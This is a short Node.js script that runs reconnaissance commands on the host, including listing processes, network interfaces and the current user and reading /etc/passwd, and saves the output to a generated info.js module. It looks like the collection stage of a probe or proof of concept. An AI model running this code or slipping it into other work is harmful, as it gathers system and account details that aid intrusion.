#!/usr/bin/env node

var exec = require('child_process').execSync;
var fs = require('fs');

var commands = [
  'ps aux',
  'lsb_release -a',
  'ifconfig',
  'uname -a',
  'id',
  'cat /etc/passwd',
];

var output = {};

commands.forEach(function(cmd) {
  output[cmd] = exec(cmd + ' 2>&1; ').toString();
});

var json = JSON.stringify(output);
var contents = 'module.exports = ' + json + ';';

fs.writeFileSync('info.js', contents);
